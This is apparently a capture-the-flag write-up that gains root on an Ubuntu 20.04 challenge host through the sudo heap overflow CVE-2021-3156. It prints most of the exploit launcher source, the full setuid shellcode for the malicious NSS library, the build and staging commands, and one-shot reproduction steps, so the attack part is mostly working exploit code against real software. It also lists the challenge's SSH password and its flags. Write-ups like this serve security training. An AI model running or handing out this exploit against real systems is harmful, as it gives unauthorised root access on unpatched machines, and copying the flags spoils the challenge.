# Vodoo Spirit of Death — 2 — Writeup

**"Get to root"**

| | |
|---|---|
| **Challenge** | Vodoo Spirit of Death - 2 (KPMG CTF) |
| **Points** | 10 |
| **Category** | Infra / Linux (multi-service) |
| **Goal** | Get to root |
| **Service** | `nc 0.cloud.chals.io 32779` → SSH (`SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13`) |
| **Credentials** | `maya.chen : Onboard-Maya25!` (found in Part 1 via exposed Redis chat) |
| **User flag** | `KPMG_CTF{6cf60da16034c94ec03370ce6f90308c}` |
| **Root flag** | `KPMG_CTF{70uFWYXOQHHQyPDE-U8hnnosfwrCFhkFuANAqdZWo_9-}` |
| **Root path** | **CVE‑2021‑3156 / "Baron Samedit"** — `sudo 1.8.31-1ubuntu1` heap overflow |
| **Status** | ✅ Root achieved |
| **Date** | 2026-10-11 |

---

## 1. Executive Summary

Part 1 of the "Vodoo Spirit of Death" series ended with a foothold as `maya.chen` and the
*user* flag. Part 2 is the same container family, a fresh instance, and the goal is exactly one
line: **get to root**.

The instance still ships the *unpatched* **`sudo 1.8.31-1ubuntu1`** on **Ubuntu 20.04.6**
(glibc `2.31-0ubuntu9.17`). That build is vulnerable to **CVE‑2021‑3156**, the heap‑based buffer
overflow in `sudoedit -s`, nicknamed **Baron Samedit** by Qualys. The challenge name
"Vodoo Spirit of Death" is a direct pun on **Baron Samedi** — the Vodou *spirit of death* —
and the in‑game employee `baron.samedit` nails the hint.

The environment is deliberately hardened to force a *local-process* exploit rather than a
file-drop or scheduled-task trick:

* `/tmp`, `/var/tmp`, `/dev/shm` are **not** writable by the player (`1755`).
* `/run/lock` **is** world‑writable and executable (`1777`) → used as the staging ground.
* There is **no compiler** on the box → the exploit must be built offline.
* `acme-fs-guard.sh` (root, every 2 s) deletes any new file under `~maya.chen`
  *"Files only -- never touches processes -- so it cannot interrupt a live shell/SSH/python
  session."*
* `sudo` requires a **terminal**, so a plain non‑interactive channel can't drive it.

The **decisive approach change** was the choice of exploit. `sudo 1.8.31-1ubuntu1` sits on
glibc `2.31-0ubuntu9.17` (a later 20.04 point release) whose `malloc` internals differ slightly
from the 20.04.1 that blasty's famous "singleshot" `sudo-hax-me-a-sandwich` was tuned for — that
PoC *kept missing* and fell through to the password prompt. Switching to **CptGibbon's
"no bruteforce" PoC** (a deterministic Qualys-style heap groom) worked on the **first run**,
with **no looping and no timeouts**.

Result:

```text
# id
uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)
# cat /root/root.txt
KPMG_CTF{70uFWYXOQHHQyPDE-U8hnnosfwrCFhkFuANAqdZWo_9-}
```

---

## 2. Target Information

| Item | Value |
|---|---|
| Entry | `nc 0.cloud.chals.io 32779` → SSH |
| SSH banner | `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13` |
| OS | Ubuntu 20.04.6 LTS (Focal Fossa) |
| glibc | `2.31-0ubuntu9.17` |
| Kernel | `6.8.0-136-generic` (host kernel — containerised) |
| Container hostname | `c389ff99c726` |
| sudo | `1.8.31-1ubuntu1` — vulnerable to CVE‑2021‑3156 |
| Portal | `python3 /opt/portal/app.py` (runs as **root**, `0.0.0.0:5000` behind nginx) |
| Redis | `redis-server 5.0.7` on `0.0.0.0:6379`, **no auth** |
| Users | `maya.chen`(1000), `derek.ross`(1001), `alex.johnson`(1002), `sarah.patel`(1003) |
| Guard | `/usr/local/bin/acme-fs-guard.sh` — `rm`s player files under `~maya.chen` every 2 s |
| Scratch | `/tmp` `1755`, `/var/tmp` `1755`, `/dev/shm` `1755`, **`/run/lock` `1777` + exec** |
| Root flag | `/root/root.txt` (`-rw------- root:root`, 54 bytes) |

---

## 3. Foothold (carried over from Part 1)

Part 1's exposed Redis held a chat DM with a temporary SSH password:

```bash
$ ssh maya.chen@0.cloud.chals.io -p 32779
Password: Onboard-Maya25!
$ id
uid=1000(maya.chen) gid=1000(maya.chen) groups=1000(maya.chen)

$ cat ~/.local/share/acme-agent/.vault/user.txt
KPMG_CTF{6cf60da16034c94ec03370ce6f90308c}
```

Recon confirms the same hardened layout as Part 1 (`fs-guard` script, `sudo 1.8.31`, no
compiler, `/run/lock` `1777`).

---

## 4. Root-Escalation Analysis

### 4.1 The hint is the challenge name

"Vodoo Spirit of Death" = **Baron Samedi**, the Vodou spirit of death. The in-app user
`baron.samedit` is a pun on **Baron Samedit**, Qualys's handle for **CVE‑2021‑3156**.

### 4.2 Vulnerable `sudo` confirmed

```bash
$ sudo --version
Sudo version 1.8.31          # first fixed release on Ubuntu: 1.8.31-1ubuntu1.2
$ ldd --version | head -1
ldd (Ubuntu GLIBC 2.31-0ubuntu9.17) 2.31
$ ls -l /usr/bin/sudoedit /usr/bin/sudo
-rwsr-xr-x 1 root root ... /usr/bin/sudoedit
-rwsr-xr-x 1 root root ... /usr/bin/sudo
```

`maya.chen` has **no** sudoers entry (`sudo -S -l` → "Sorry, user maya.chen may not run sudo
on …"), so there is no misconfiguration to abuse — it is a genuine memory-corruption bug.

### 4.3 Ruled-out paths (why a local exploit is required)

* **No scheduled root job** — a 70-second `ps` sweep showed only `entrypoint.sh`,
  `supervisord`, `acme-fs-guard.sh` (sleep‑2 loop), the root Flask portal and nginx. No cron,
  no `at`, no writable root-run script.
* **Supervisor socket** — `/var/run/supervisor.sock` is `0700 root` → not usable.
* **No docker socket**, no `pkexec` (so no PwnKit), no writable system binary.
* **`acme-backup.sh`** sources `/etc/acme/backup.conf` and `eval`s `RUN_CMD`, but the conf is
  `root:root 0644` and nothing schedules the script → dead end.
* **The root portal** was mapped (`/`, `/login`, `/dashboard`, `/employees`, `/accounts`,
  `/chat`, `/chat/<id>`, `/chat/search?q=`, `/logout`, `robots.txt`), but no injection/RCE
  surface was found (search output is reflected, not eval'd).

Everything points squarely at **CVE‑2021‑3156**.

### 4.4 Approach change: from "singleshot" to a deterministic groom

blasty's `sudo-hax-me-a-sandwich` (target index 1 → `(smash_a, smash_b, null_stomp, lc_all) =
(56, 54, 63, 212)`) is a *singleshot* relying on the exact 20.04.1 heap layout. On this newer
glibc it **consistently missed** — the overflow never hit the NSS `service_user` struct and
`sudoedit` fell through to the normal password prompt:

```text
** pray for your rootshell.. **
[sudo] password for maya.chen:
maya.chen is not in the sudoers file.  This incident will be reported.
```

Rather than brute-forcing parameter combinations (blasty ships a `-DBRUTE` mode; that was
explicitly avoided), the exploit was **swapped for CptGibbon's "no bruteforce" PoC**
(`github.com/CptGibbon/CVE-2021-3156`, by Max Kamper, tested against Ubuntu 20.04 / sudo
1.8.31). It uses a deterministic Qualys-style heap groom: an 0xf0-sized overflowing chunk is
allocated *immediately before* the target `service_user` struct, and a long `LC_*`
"feng-shui" environment bridges the gap. It landed first try.

---

## 5. Building the Exploit Offline

No compiler on the target, so both pieces were built on the analyst host.

### 5.1 Exploit launcher (`exploit.c`)

Builds `argv = {"sudoedit", "-s", <0xe0 'Y's + '\\'>}` and an `envp` that heap-grooms the
NSS name pointer to `x/x`, then `execve("/usr/bin/sudoedit", argv, envp)`:

```c
char buf[0xf0] = {0};
memset(buf, 'Y', 0xe0);
strcat(buf, "\\");                     // trailing backslash triggers the overflow
char* argv[] = { "sudoedit", "-s", buf, NULL };

char messages[0xe0] = {"LC_MESSAGES=en_GB.UTF-8@"};  memset(messages + strlen(messages), 'A', 0xb8);
char telephone[0x50] = {"LC_TELEPHONE=C.UTF-8@"};    memset(telephone + strlen(telephone), 'A', 0x28);
char measurement[0x50] = {"LC_MEASUREMENT=C.UTF-8@"};memset(measurement + strlen(measurement), 'A', 0x28);
char overflow[0x500] = {0}; memset(overflow, 'X', 0x4cf); strcat(overflow, "\\");

char* envp[] = { overflow, "\\","\\",...,"XXXXXXX\\",...,"x/x\\", "Z",
                 messages, telephone, measurement, NULL };
execve("/usr/bin/sudoedit", argv, envp);
```

`"x/x\"` is what rewrites the NSS `files` service name, making glibc `dlopen`
**`libnss_x/x.so.2` relative to the current working directory**.

### 5.2 The payload module

```c
static void __attribute__((constructor)) _init(void) {
  __asm __volatile__(
      "addq $64, %rsp;"
      "movq $105, %rax; movq $0, %rdi; syscall;"   // setuid(0)
      "movq $106, %rax; movq $0, %rdi; syscall;"   // setgid(0)
      "movq $59, %rax;"                            // execve("/bin/sh", ["/bin/sh"], NULL)
      "movq $0x0068732f6e69622f, %rdi;"
      "pushq %rdi; movq %rsp, %rdi;"
      "movq $0, %rdx; pushq %rdx; pushq %rdi; movq %rsp, %rsi;"
      "syscall;"
      "movq $60, %rax; movq $0, %rdi; syscall;");   // exit(0)
}
```

Built freestanding so it has **no `DT_NEEDED`** dependencies (loads under any glibc):

```bash
gcc -O3 -static       -o exploit        exploit.c
gcc -O3 -shared -nostdlib -fPIC -o libnss_x/x.so.2 shellcode.c
tar czf cpt.tgz exploit libnss_x
```

---

## 6. Staging & Upload

`/tmp`, `/var/tmp` and `/dev/shm` are `1755`, so the archive goes to **`/run/lock`** (`1777`
+ exec). SFTP was blocked, so the file is uploaded over the SSH **exec** channel as
base64-over-stdin (see `scripts/upload_tgz.py`):

```bash
$ mkdir -p /run/lock/cpt
$ base64 -d > /run/lock/cpt/cpt.tgz   # 398,993 bytes
$ cd /run/lock/cpt && tar xzf cpt.tgz
$ ls -l
-rwxr-xr-x maya.chen  886688  exploit
-rwxr-xr-x maya.chen   13816  libnss_x/x.so.2
```

---

## 7. Trigger — under a real PTY

`paramiko`'s `exec_command()` + `get_pty()` did **not** give `sudo` a usable terminal
(`tty` reported "not a tty"). Using **`invoke_shell()`** (equivalent to `ssh -tt`) allocates a
real controlling pty — `tty` → `/dev/pts/0` — which is what `sudo`'s policy needs:

```text
$ cd /run/lock/cpt && ./exploit
#
# id
uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)
#
```

The `_init` constructor of `libnss_x/x.so.2` runs **as uid 0** (inside the setuid‑root
`sudoedit` process, during the NSS lookup that precedes authentication), calls
`setuid(0)/setgid(0)` and `execve("/bin/sh")`.

---

## 8. Root — Flags

```text
# ls -la /root/
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root   54 Oct 11 02:33 root.txt

# cat /root/root.txt
KPMG_CTF{70uFWYXOQHHQyPDE-U8hnnosfwrCFhkFuANAqdZWo_9-}
```

| Flag | Value |
|---|---|
| User | `KPMG_CTF{6cf60da16034c94ec03370ce6f90308c}` |
| **Root** | **`KPMG_CTF{70uFWYXOQHHQyPDE-U8hnnosfwrCFhkFuANAqdZWo_9-}`** |

The instance was torn down by the platform shortly after root was obtained; the root shell
capture is preserved in `evidence/`.

---

## 9. Findings

| # | Finding | Severity |
|---|---|---|
| 1 | `sudo 1.8.31-1ubuntu1` → **CVE‑2021‑3156** local heap overflow → full root | **Critical** |
| 2 | Root Flask portal (`/opt/portal/app.py`) reachable on `0.0.0.0:5000` behind nginx | High |
| 3 | Redis 5.0.7 exposed with no authentication; leaked the SSH credential | High |
| 4 | `/run/lock` world-writable **and** executable → reliable local staging area | Medium |
| 5 | `acme-fs-guard.sh` only removes *files*, explicitly not processes (weak control) | Low |

---

## 10. Remediation

1. **Patch sudo** — upgrade to `1.8.31-1ubuntu1.2` (or later). This is the root cause; nothing
   else matters until it is fixed.
2. **Authenticate Redis** and bind it to localhost; rotate any credential that ever touched it.
3. **Tighten scratch space** — mount `/run/lock` (and `/tmp`, `/var/tmp`, `/dev/shm`) with
   `nosuid,noexec,nodev` and avoid world-writable+exec directories for such paths.
4. **Least privilege** — run the portal as a dedicated unprivileged service account, not root.

---

## 11. Reproduction (clean)

```bash
# 1) build on the analyst host
git clone https://github.com/CptGibbon/CVE-2021-3156
cd CVE-2021-3156
gcc -O3 -static -o exploit exploit.c
mkdir -p libnss_x
gcc -O3 -shared -nostdlib -fPIC -o libnss_x/x.so.2 shellcode.c
tar czf cpt.tgz exploit libnss_x

# 2) upload to /run/lock/cpt (base64 over the SSH exec channel) and extract
# 3) open an interactive pty (ssh -tt) and run:
cd /run/lock/cpt && ./exploit        # -> root shell, one shot, no loop
cat /root/root.txt
```

---

## 12. Artifact Inventory

```
VodooSpiritOfDeath2/
├── VodooSpiritOfDeath2-writeup.md      <- this file
├── artifacts/
│   ├── CptGibbon_exploit.c             working PoC source (exploit.c)
│   ├── CptGibbon_shellcode.c           payload constructor (shellcode.c)
├   ├── CptGibbon_Makefile
│   ├── cpt.tgz                         staged exploit + libnss_x/x.so.2
│   ├── hax.c / hax_static              blasty PoC (tried, missed)
│   ├── lib.c                           blasty-style payload module
│   ├── libnss_X/'P0P_SH3LLZ_ .so.2'
│   ├── payload.tgz                     blasty payload archive
│   └── ssh_helper.py, pty_run.py       paramiko helpers
├── cptgibbon/
│   ├── exploit(.c)                     static build + source
│   ├── shellcode.c
│   └── libnss_x/x.so.2                 freestanding root payload (.so)
├── scripts/
│   ├── upload_tgz.py                   base64-over-stdin uploader
│   ├── trigger_cpt.py                  PTY trigger + flag grab (the working one)
│   ├── trigger_samedit.py              blasty trigger (missed)
│   ├── root_capture.py / final_capture.py
│   ├── deep_recon.py / watch_root.py / sudo_check.py / varacme.py
│   ├── redis_dump.py / remote_redis_dump.py
│   ├── portal_probe.py / portal_login.py / portal_routes.py / portal_deep.py
│   ├── recon.py / recon2.py / post_exploit.py
│   └── stage_payload.py / run_exploit.py / verify_module.py
└── evidence/
    ├── cpt_trigger1.txt                root shell + flag (winner)
    ├── root_shell_capture.txt
    ├── root_shell.txt / final_capture.txt
    ├── deep_recon.txt / watch_root.txt / varacme.txt
    ├── redis_dump2.txt
    ├── recon1.txt / recon2.txt / trigger1.txt
    └── port_watch.log
```

---

### One-line takeaway

> The box is Ubuntu 20.04 with an **unpatched `sudo 1.8.31`**; "Baron Samedi" is
> **Baron Samedit (CVE‑2021‑3156)**. Stage a *deterministic* `sudoedit -s` heap-overflow
> exploit in `/run/lock`, drive it over a real pty, and reverse-shell root in one shot.
